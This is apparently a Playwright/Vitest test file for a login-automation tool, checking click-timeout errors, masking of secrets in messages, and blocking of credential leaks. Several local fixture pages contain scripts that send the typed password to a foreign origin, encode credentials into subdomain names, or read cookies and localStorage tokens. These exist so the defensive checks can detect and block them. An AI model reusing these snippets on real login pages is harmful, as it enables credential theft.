import { createServer, type Server } from 'node:http';
import { chromium, type Browser, type BrowserContextOptions } from '@playwright/test';
import { afterAll, beforeAll, describe, expect, it, type TestContext } from 'vitest';
import type { Kimlik } from '../../src/depo/index.js';
import { girisKorumasiKur } from '../../src/kesif/giris-korumasi.js';
import {
  CredentialLeakBlockedError,
  girisFormuBul,
  girisiGonder,
  LoginFormOriginError,
  LoginSubmitTimeoutError,
} from '../../src/kesif/index.js';
import { baslat } from '../kobay-demo/sunucu.mjs';

/**
 * A3: gönder düğmesine tıklama sınırlı sürede beklenir; zaman aşımında ham Playwright hatası
 * yerine düğme durumunu ve giriş penceresinde kesilen istekleri anlatan tek giriş hatası
 * (`LoginSubmitTimeoutError`, CLI'da `LoginFormOriginError` → çıkış kodu 5). Mesajın tamamı
 * sır envanteriyle maskelenir. Gerçek Chromium. Uygulama `127.0.0.1`, yabancı origin aynı
 * sunucunun `localhost` adı (ayrı site); `*.localhost` adları da aynı sunucuya düşer.
 */

const KULLANICI = 'gizli-kullanici@ornek.test';
const PAROLA = 'tiklama-parola-987';
const CEREZ = 'cerez-degeri-55555';
const TIKLAMA_MS = 1_500;
const kati = process.env.KOBAY_TEST_STRICT === '1';
let tarayiciEngeli: unknown;
let tarayici: Browser | undefined;
let sunucu: Server | undefined;
let demo: { url: string; kapat: () => Promise<void> } | undefined;
let port = 0;
let appOrigin = '';
let yabanciOrigin = '';

function form(dugme: string, ek = ''): string {
  return `<!doctype html><html><body><form action="/giris" method="post"><input type="text" name="k">`
    + `<input type="password" name="p">${dugme}</form>${ek}</body></html>`;
}

/** Parola alanına yazılınca çalışan betik (`p`: parola alanı, `k`: kullanıcı alanı, `b`: düğme). */
function yazinca(govde: string): string {
  return '<script>const p=document.querySelector(\'input[type=password]\');const k=document.querySelector(\'input[type=text]\');'
    + `const b=document.querySelector('button');p.addEventListener('input',()=>{${govde}},{once:true});</script>`;
}

type Cevap = { kod?: number; basliklar?: Record<string, string>; govde?: string; gecikmeMs?: number };

const SAYFALAR: Record<string, () => Cevap> = {
  '/disabled': () => ({ govde: form('<button type="submit" disabled title="Complete the security check first">Log in</button>') }),
  '/aria': () => ({ govde: form('<button type="submit" aria-disabled="true">Sign in</button>') }),
  '/ortulu': () => ({ govde: form(
    '<button type="submit">Log in</button>',
    '<div id="perde" style="position:fixed;inset:0;background:rgba(0,0,0,.2)"></div>',
  ) }),
  // Kilitli değil ama hiç durmayan animasyon: Playwright "stable" bekler, tıklama zaman aşar.
  '/kaygan': () => ({ govde: form(
    '<button type="submit" style="animation:kay .2s linear infinite alternate">Log in</button>',
    '<style>@keyframes kay{from{transform:translateX(0)}to{transform:translateX(40px)}}</style>',
  ) }),
  // Sayfa kimliği ve çerezi düğmenin title'ına yansıtır: hata mesajına sızmamalı.
  '/yansitan': () => ({ govde: form(
    '<button type="submit" disabled>Log in</button>',
    `<script>document.cookie='sid=${CEREZ}; path=/';</script>`
      + yazinca('b.title=\'Signed as \'+k.value+\' with \'+p.value+\' \'+document.cookie;'),
  ) }),
  // Parola yazılınca yabancı origin'den bir çerçeve yüklemeye çalışır (pencerede kesilir).
  '/cerceve': () => ({ govde: form(
    '<button type="submit" disabled>Log in</button>',
    yazinca(`const f=document.createElement('iframe');f.src=${JSON.stringify(`${yabanciOrigin}/widget`)};document.body.append(f);`),
  ) }),
  // Kilitli düğme + parolayı yabancı origin'e gönderen sayfa: gerçek sızıntı hatası kazanmalı.
  '/sizdiran': () => ({ govde: form(
    '<button type="submit" disabled>Log in</button>',
    yazinca(`fetch(${JSON.stringify(`${yabanciOrigin}/topla?p=`)}+encodeURIComponent(p.value),{mode:'no-cors'}).catch(()=>{});`),
  ) }),
  // Parolayı, adı parolanın kendisi olan yabancı alt alana yollar: sızıntı hatasındaki origin maskelenmeli.
  '/sizdiran-alt': () => ({ govde: form(
    '<button type="submit" disabled>Log in</button>',
    yazinca(`fetch('http://'+p.value+'.localhost:${port}/x?p='+encodeURIComponent(p.value),{mode:'no-cors'}).catch(()=>{});`),
  ) }),
  // Kilitli düğme + 302 ile yabancıya yönlenen aynı-origin çerçeve (ayak route'a uğramaz, tespit edilir).
  '/yonlenen': () => ({ govde: form(
    '<button type="submit" disabled>Log in</button>',
    yazinca('const f=document.createElement(\'iframe\');f.src=\'/belge-302\';document.body.append(f);'),
  ) }),
  '/belge-302': () => ({ kod: 302, basliklar: { location: `${yabanciOrigin}/yonlendirilmis-belge` } }),
  // Kısa parola düğme title'ına, kullanıcı adı ve parola yabancı alt alan adlarına yansır.
  '/alt-alan': () => ({ govde: form(
    '<button type="submit" disabled>Log in</button>',
    yazinca('b.title=\'Hi \'+p.value;for(const ad of [k.value.toLowerCase(),p.value]){'
      + `fetch('http://'+ad+'.localhost:${port}/pixel',{mode:'no-cors'}).catch(()=>{});}`),
  ) }),
  // Düğme yazısı parolanın kendisi olur (uzun parolada kırpma maskeden önce yapılırsa başı sızar).
  '/yazi-parola': () => ({ govde: form('<button type="submit" disabled>Log in</button>', yazinca('b.textContent=p.value;')) }),
  // Kullanıcı adının URL-kodlu biçimi title'a yansır.
  '/kodlu': () => ({ govde: form(
    '<button type="submit" disabled>Log in</button>',
    yazinca('b.title=\'u=\'+encodeURIComponent(k.value);'),
  ) }),
  // Yüklü oturumun çerez ve localStorage değerlerini açılışta alıp siler, sonra title'a yazar.
  '/depo': () => ({ govde: form(
    '<button type="submit" disabled>Log in</button>',
    '<script>const c=document.cookie;const t=localStorage.getItem(\'token\');localStorage.removeItem(\'token\');'
      + 'document.cookie=\'sid=; path=/; max-age=0\';</script>'
      + yazinca('b.title=\'c=\'+c+\' t=\'+t;'),
  ) }),
  // Kilitli düğme 1,5 sn sonra açılır; gönderim uygulama içinde yönlendirir.
  '/gec-acilan': () => ({ govde: form(
    '<button type="submit" disabled>Log in</button>',
    '<script>setTimeout(()=>{document.querySelector(\'button\').disabled=false;},1500);</script>',
  ) }),
  'POST /giris': () => ({ kod: 302, basliklar: { location: '/panel' } }),
  // Parola yazıldıktan 300 ms sonra sayfanın JavaScript'i sonsuz döngüye girer (donmuş sayfa).
  '/donmus': () => ({ govde: form(
    '<button type="submit" disabled>Log in</button>',
    yazinca('setTimeout(()=>{while(true){}},300);'),
  ) }),
  // localStorage'da sırsız bir API adresi ve gerçek bir belirteç; sayfa captcha origin'ine istek atar.
  '/adresli': () => ({ govde: form(
    '<button type="submit" disabled>Log in</button>',
    yazinca(`fetch(${JSON.stringify(`${yabanciOrigin}/challenge`)},{mode:'no-cors'}).catch(()=>{});`
      + 'b.title=\'t=\'+JSON.parse(localStorage.getItem(\'ayar\')).token;'),
  ) }),
  // Geç açılan düğme + gönderimden sonra yavaş yanıt veren sunucu.
  '/gec-yavas': () => ({ govde: form(
    '<button type="submit" disabled>Log in</button>',
    '<script>document.querySelector(\'form\').action=\'/giris-yavas\';'
      + 'setTimeout(()=>{document.querySelector(\'button\').disabled=false;},1500);</script>',
  ) }),
  'POST /giris-yavas': () => ({ kod: 302, basliklar: { location: '/panel' }, gecikmeMs: 800 }),
  // Geç açılan düğme; gönderimi tıklamadan 300 ms sonra betik yapar (tıklama gezinme beklemeden döner).
  '/gec-betik': () => ({ govde: form(
    '<button type="submit" disabled>Log in</button>',
    '<script>const f=document.querySelector(\'form\');const b=document.querySelector(\'button\');'
      + 'b.addEventListener(\'click\',(e)=>{e.preventDefault();setTimeout(()=>f.submit(),300);});'
      + 'setTimeout(()=>{b.disabled=false;},1500);</script>',
  ) }),
  // Alanlar 6 sn sonra açılır (yavaş ama sağlıklı giriş sayfası); doldurma beklemesi bunu kaldırmalı.
  '/yavas-alan': () => ({ govde: '<!doctype html><html><body><form action="/giris" method="post">'
    + '<input type="text" name="k" disabled><input type="password" name="p" disabled><button type="submit">Log in</button></form>'
    + '<script>setTimeout(()=>{for(const i of document.querySelectorAll(\'input\'))i.disabled=false;},6000);</script></body></html>' }),
  // Gönderim URL'yi hiç değiştirmez: giriş başarısız sayılır, URL bütçesi tıklamadan sonra dolar.
  '/gonderilmeyen': () => ({ govde: form(
    '<button type="submit">Log in</button>',
    '<script>document.querySelector(\'form\').addEventListener(\'submit\',(e)=>e.preventDefault());</script>',
  ) }),
  '/panel': () => ({ govde: '<!doctype html><html><body><h1>Panel</h1></body></html>' }),
};

beforeAll(async () => {
  try {
    tarayici = await chromium.launch({ headless: true });
  } catch (hata) {
    tarayiciEngeli = hata;
    return;
  }
  try {
    sunucu = createServer((istek, yanit) => {
      istek.resume();
      istek.on('end', () => {
        const yol = new URL(istek.url ?? '/', 'http://x').pathname;
        const sayfa = SAYFALAR[istek.method === 'POST' ? `POST ${yol}` : yol];
        const cevap: Cevap = sayfa?.() ?? { kod: 404 };
        setTimeout(() => {
          yanit.writeHead(cevap.kod ?? 200, { 'content-type': 'text/html', ...cevap.basliklar });
          yanit.end(cevap.govde ?? '');
        }, cevap.gecikmeMs ?? 0);
      });
    });
    port = await new Promise<number>((coz, reddet) => {
      sunucu?.once('error', reddet);
      sunucu?.listen(0, '127.0.0.1', () => {
        const adres = sunucu?.address();
        coz(typeof adres === 'object' && adres !== null ? adres.port : 0);
      });
    });
    appOrigin = `http://127.0.0.1:${port}`;
    yabanciOrigin = `http://localhost:${port}`;
    demo = await baslat(0, { kilitliGiris: true, captchaOrigin: yabanciOrigin }) as typeof demo;
  } catch (hata) {
    tarayiciEngeli = hata;
  }
});

afterAll(async () => {
  await tarayici?.close();
  await demo?.kapat();
  if (sunucu?.listening) await new Promise((coz) => { sunucu?.close(coz); });
});

function tarayiciMumkun(context: TestContext): boolean {
  if (!tarayiciEngeli) return true;
  const ozet = String(tarayiciEngeli).split('\n')[0] ?? '';
  if (kati) throw new Error(`KOBAY_TEST_STRICT=1: Gerçek Chromium atlanamaz: ${ozet}`);
  context.skip(`Gerçek Chromium bu ortamda engelli: ${ozet}`);
  return false;
}

interface DenemeSecenegi {
  kimlik?: Partial<Kimlik>;
  urlBeklemeMs?: number;
  tiklamaBeklemeMs?: number;
  /** Bağlam bu oturumla açılır ve koruma (sayfayiYenile'deki gibi) ilk sayfadan önce kurulur. */
  storageState?: Exclude<BrowserContextOptions['storageState'], string | undefined>;
}

/** Verilen giriş sayfasında girişi dener; `girisiGonder`in fırlattığını (ya da sonucu) döner. */
async function girisDene(loginUrl: string, secenek: DenemeSecenegi = {}): Promise<unknown> {
  if (tarayici === undefined) throw new Error('tarayıcı yok');
  const hedefOrigin = new URL(loginUrl).origin;
  const context = await tarayici.newContext({
    serviceWorkers: 'block',
    ...(secenek.storageState === undefined ? {} : { storageState: secenek.storageState }),
  });
  try {
    const kimlik: Kimlik = { username: KULLANICI, password: PAROLA, origin: hedefOrigin, ...secenek.kimlik };
    if (secenek.storageState !== undefined) await girisKorumasiKur(context, kimlik, [hedefOrigin]);
    const sayfa = await context.newPage();
    await sayfa.goto(loginUrl, { waitUntil: 'domcontentloaded' });
    const giris = await girisFormuBul(sayfa);
    if (giris === null) throw new Error('form yok');
    return await girisiGonder(
      sayfa, giris, kimlik, hedefOrigin, [], secenek.urlBeklemeMs ?? 5_000, 1_000, secenek.tiklamaBeklemeMs ?? TIKLAMA_MS,
    ).then((sonuc) => sonuc.basarili, (hata: unknown) => hata);
  } finally {
    await context.close();
  }
}

/** Her zaman aşımı hatasında ortak olanlar: sınıf, süre, ham Playwright mesajının önde olmaması, sır yok. */
function ortakBeklentiler(sonuc: unknown, sirlar: readonly string[] = [PAROLA, KULLANICI, CEREZ]): string {
  expect(sonuc).toBeInstanceOf(LoginSubmitTimeoutError);
  // CLI giriş hatalarını bu sınıf üzerinden çıkış kodu 5'e eşler (`girisHatasiniCevir`).
  expect(sonuc).toBeInstanceOf(LoginFormOriginError);
  const mesaj = (sonuc as Error).message;
  expect(mesaj).toMatch(/^Login could not be submitted: clicking the submit button/);
  expect(mesaj).toContain('did not complete within 2 s; the session was not saved.');
  expect(mesaj).toContain('Playwright: locator.click: Timeout 1500ms exceeded');
  expect(mesaj).not.toContain('Call log');
  for (const sir of sirlar) expect(mesaj.toLowerCase()).not.toContain(sir.toLowerCase());
  return mesaj;
}

describe('giriş gönder tıklaması zaman aşımı (A3)', () => {
  it('disabled düğme: durum, title ve görünür metin; Playwright adımı ipucu olarak sonda', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const mesaj = ortakBeklentiler(await girisDene(`${appOrigin}/disabled`));
    expect(mesaj).toContain('clicking the submit button ("Log in")');
    expect(mesaj).toContain('The button is locked: it is disabled.');
    expect(mesaj).toContain('Button title: "Complete the security check first".');
    expect(mesaj).toContain('(last step: element is not enabled)');
    expect(mesaj.indexOf('The button is locked')).toBeLessThan(mesaj.indexOf('Playwright:'));
  });

  it('aria-disabled düğme kilitli sayılır', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const mesaj = ortakBeklentiler(await girisDene(`${appOrigin}/aria`));
    expect(mesaj).toContain('("Sign in")');
    expect(mesaj).toContain('The button is locked: it is marked aria-disabled="true".');
  });

  it('üstü başka öğeyle kapalı düğme kilitli sayılır ve örten öğe adlandırılır', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const mesaj = ortakBeklentiler(await girisDene(`${appOrigin}/ortulu`));
    expect(mesaj).toContain('The button is locked: another element covers it (<div id="perde">).');
  });

  it('kilitli olmayan düğmede tıklama yine zaman aşarsa aynı hata, "not locked" bilgisiyle', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const mesaj = ortakBeklentiler(await girisDene(`${appOrigin}/kaygan`));
    expect(mesaj).toContain('The button is not locked (enabled, visible, not covered)');
    expect(mesaj).not.toContain('The button is locked');
  });

  it('demo kilitli giriş: pencerede kesilen captcha istekleri kesim notu ve --auth-origin önerisiyle', async (context) => {
    if (!tarayiciMumkun(context)) return;
    if (demo === undefined) throw new Error('demo yok');
    const mesaj = ortakBeklentiler(await girisDene(`${demo.url}/login`));
    expect(mesaj).toContain('The button is locked: it is disabled.');
    expect(mesaj).toMatch(/During login kobay blocked \d+ third-party requests? \(http:\/\/localhost:\d+\)/);
    expect(mesaj).toContain(`; add --auth-origin ${yabanciOrigin} if you trust it with the password`);
  });

  it('pencerede kesilen yabancı belge açıklaması düğme durumuyla tek hatada birleşir', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const mesaj = ortakBeklentiler(await girisDene(`${appOrigin}/cerceve`));
    expect(mesaj).toContain('The button is locked: it is disabled.');
    expect(mesaj).toContain(`blocked 1 cross-origin document load during login: ${yabanciOrigin}`);
  });

  it('sayfanın düğmeye yansıttığı kullanıcı adı, parola ve çerez mesajda [redacted] olur', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const mesaj = ortakBeklentiler(await girisDene(`${appOrigin}/yansitan`));
    expect(mesaj).toContain('Button title: "Signed as [redacted] with [redacted] sid=[redacted]".');
  });
});

describe('tıklama zaman aşımında öncelik: sızıntı ve yönlendirme reddi gömülmez', () => {
  it('kilitli düğme + parolayı yabancı origin\'e yollayan sayfa: CredentialLeakBlockedError kazanır', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const sonuc = await girisDene(`${appOrigin}/sizdiran`);
    expect(sonuc).toBeInstanceOf(CredentialLeakBlockedError);
    expect(sonuc).not.toBeInstanceOf(LoginSubmitTimeoutError);
    const mesaj = (sonuc as Error).message;
    expect(mesaj).toMatch(/^The login page tried to send the credentials to a different site \(http:\/\/localhost:\d+\)/);
    expect(mesaj).not.toContain('Login could not be submitted');
    expect(mesaj).not.toContain(PAROLA);
  });

  it('kilitli düğme + kesilemeyen 302 belge ayağı: yönlendirme reddi kazanır', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const sonuc = await girisDene(`${appOrigin}/yonlenen`);
    expect(sonuc).toBeInstanceOf(CredentialLeakBlockedError);
    expect(sonuc).not.toBeInstanceOf(LoginSubmitTimeoutError);
    expect((sonuc as Error).message).toMatch(/^Login refused: kobay detected 1 cross-origin document redirect/);
    expect((sonuc as Error).message).toContain(`--auth-origin ${yabanciOrigin}`);
  });
});

describe('tıklama zaman aşımı mesajında sır maskesi', () => {
  it('sızıntı hatasında parolayı taşıyan yabancı origin de maskelenir', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const sonuc = await girisDene(`${appOrigin}/sizdiran-alt`);
    expect(sonuc).toBeInstanceOf(CredentialLeakBlockedError);
    const mesaj = (sonuc as Error).message;
    expect(mesaj).toMatch(/^The login page tried to send the credentials to a different site \(http:\/\/\[redacted\]\.localhost:\d+\)/);
    expect(mesaj).not.toContain(PAROLA);
  });

  it('koruma kendi sızıntı hatasını, girisiGonder dışında da, maskeler', async (context) => {
    if (!tarayiciMumkun(context)) return;
    if (tarayici === undefined) throw new Error('tarayıcı yok');
    const baglam = await tarayici.newContext({ serviceWorkers: 'block' });
    try {
      const koruma = await girisKorumasiKur(baglam, { username: KULLANICI, password: PAROLA, origin: appOrigin }, [appOrigin]);
      const sayfa = await baglam.newPage();
      await sayfa.goto(`${appOrigin}/panel`);
      koruma.pencereyiAc();
      await sayfa.evaluate(async (adres) => {
        await fetch(adres, { mode: 'no-cors' }).catch(() => undefined);
      }, `http://${PAROLA}.localhost:${port}/x?p=${PAROLA}`);
      let hata: unknown;
      try {
        koruma.denetle(false);
      } catch (yakalanan: unknown) {
        hata = yakalanan;
      }
      expect(hata).toBeInstanceOf(CredentialLeakBlockedError);
      expect((hata as Error).message).toContain('(http://[redacted].localhost:');
      expect((hata as Error).message).not.toContain(PAROLA);
    } finally {
      await baglam.close();
    }
  });

  it('kısa parola alanda [withheld], kısa/uzun sır geçen yabancı adresler maskelenir (büyük/küçük harf duyarsız)', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const kimlik = { username: 'Alice-Uzun', password: 'q7z' };
    const mesaj = ortakBeklentiler(await girisDene(`${appOrigin}/alt-alan`, { kimlik }), ['alice-uzun', 'q7z']);
    expect(mesaj).toContain('Button title: "[withheld]".');
    expect(mesaj).toContain('[redacted address]');
    expect(mesaj).toMatch(/During login kobay blocked \d+ third-party requests?/);
  });

  it('uzun parola düğme yazısıysa önce maskelenir sonra kırpılır: başı da sızmaz', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const uzun = 'Uzun-Parola-0123456789-'.repeat(5).slice(0, 100);
    const mesaj = ortakBeklentiler(await girisDene(`${appOrigin}/yazi-parola`, { kimlik: { password: uzun } }), [uzun]);
    expect(mesaj).not.toContain(uzun.slice(0, 12));
    expect(mesaj).toContain('clicking the submit button ("[redacted]")');
  });

  it('kullanıcı adının URL-kodlu biçimi de maskelenir', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const mesaj = ortakBeklentiler(
      await girisDene(`${appOrigin}/kodlu`),
      [KULLANICI, encodeURIComponent(KULLANICI), PAROLA],
    );
    expect(mesaj).toContain('Button title: "u=[redacted]".');
  });

  it('yüklü oturumun (storageState) sayfanın sildiği çerez ve localStorage değerleri de maskelenir', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const cerez = 'yuklu-cerez-degeri-777';
    const token = 'yuklu-depo-degeri-888';
    const mesaj = ortakBeklentiler(await girisDene(`${appOrigin}/depo`, {
      storageState: {
        cookies: [{ name: 'sid', value: cerez, domain: '127.0.0.1', path: '/', expires: -1, httpOnly: false, secure: false, sameSite: 'Lax' }],
        origins: [{ origin: appOrigin, localStorage: [{ name: 'token', value: token }] }],
      },
    }), [cerez, token, PAROLA, KULLANICI]);
    expect(mesaj).toContain('Button title: "c=sid=[redacted] t=[redacted]".');
  });
});

describe('donmuş sayfa ve envanter sınırları', () => {
  it('JavaScript\'i donan sayfada girisiGonder tıklama bütçesi + birkaç saniyede hata verir', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const bas = Date.now();
    // Bekçi: sınırsız bir sayfa-içi çağrı girişi hiç döndürmezdi; test zaman aşımı yerine açık hata.
    const bekci = new Promise((coz) => { setTimeout(() => { coz('BEKÇİ: girisiGonder 20 sn içinde dönmedi'); }, 20_000); });
    const sonuc = await Promise.race([girisDene(`${appOrigin}/donmus`, { tiklamaBeklemeMs: 2_000 }), bekci]);
    const gecen = Date.now() - bas;
    expect(sonuc).toBeInstanceOf(LoginSubmitTimeoutError);
    expect(gecen).toBeLessThan(2_000 + 10_000);
    expect((sonuc as Error).message).not.toContain(PAROLA);
  }, 40_000);

  it('localStorage\'daki sırsız adres sır sayılmaz: kesim notu ve --auth-origin önerisi okunur kalır', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const token = 'gercek-gizli-belirtec-42';
    const mesaj = ortakBeklentiler(await girisDene(`${appOrigin}/adresli`, {
      storageState: {
        cookies: [],
        origins: [{ origin: appOrigin, localStorage: [{ name: 'ayar', value: JSON.stringify({ api: yabanciOrigin, token }) }] }],
      },
    }), [token, PAROLA, KULLANICI]);
    expect(mesaj).toContain('Button title: "t=[redacted]".');
    expect(mesaj).toContain(`(${yabanciOrigin}); add --auth-origin ${yabanciOrigin} if you trust it with the password`);
  });
});

describe('alanları geç açılan sağlıklı giriş sayfası', () => {
  it('alanlar 6 sn sonra açılsa da giriş başarılı (doldurma sınırı Playwright varsayılanı kadar)', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const sonuc = await girisDene(`${appOrigin}/yavas-alan`);
    expect(sonuc).toBe(true);
  }, 30_000);
});

describe('URL bekleme bütçesi tıklama bittiğinde başlar', () => {
  it('geç açılan düğme + yavaş yanıt veren sunucu: gönderim başarılıysa giriş başarılı sayılır', async (context) => {
    if (!tarayiciMumkun(context)) return;
    // Bekleyicinin tavanı yalnız URL bütçesi olsaydı (1 sn) tıklama bitmeden dolardı; yönlendirme
    // tıklamadan 0,8 sn sonra geldiği için tıklama anındaki URL denetimi de yetmezdi.
    const sonuc = await girisDene(`${appOrigin}/gec-yavas`, { urlBeklemeMs: 1_000, tiklamaBeklemeMs: 5_000 });
    expect(sonuc).toBe(true);
  });

  it('geç açılan düğme + betikle gecikmeli gönderim: bekleyici tıklamadan önce dolmaz', async (context) => {
    if (!tarayiciMumkun(context)) return;
    // Tıklama 1,5 sn'de döner, gezinme 0,3 sn sonra başlar. Bekleyicinin tavanı yalnız URL bütçesi
    // (1 sn, tıklamadan önce başlar) olsaydı tıklama anında dolmuş olurdu.
    const sonuc = await girisDene(`${appOrigin}/gec-betik`, { urlBeklemeMs: 1_000, tiklamaBeklemeMs: 5_000 });
    expect(sonuc).toBe(true);
  });

  it('URL hiç değişmezse giriş başarısız sayılır ve tıklama bütçesi kadar beklenmez', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const bas = Date.now();
    const sonuc = await girisDene(`${appOrigin}/gonderilmeyen`, { urlBeklemeMs: 500, tiklamaBeklemeMs: 15_000 });
    expect(sonuc).toBe(false);
    // Bütçe tıklamadan sonra 0,5 sn; bekleyicinin tavanına (15,5 sn) kadar beklenseydi aşılırdı.
    expect(Date.now() - bas).toBeLessThan(8_000);
  });

  it('geç açılan düğmeyle gönderim başarılıysa giriş başarılı sayılır', async (context) => {
    if (!tarayiciMumkun(context)) return;
    // Düğme 1,5 sn sonra açılır; URL bütçesi 1 sn. Bütçe tıklamadan önce başlasaydı dolardı.
    const sonuc = await girisDene(`${appOrigin}/gec-acilan`, { urlBeklemeMs: 1_000, tiklamaBeklemeMs: 5_000 });
    expect(sonuc).toBe(true);
  });
});
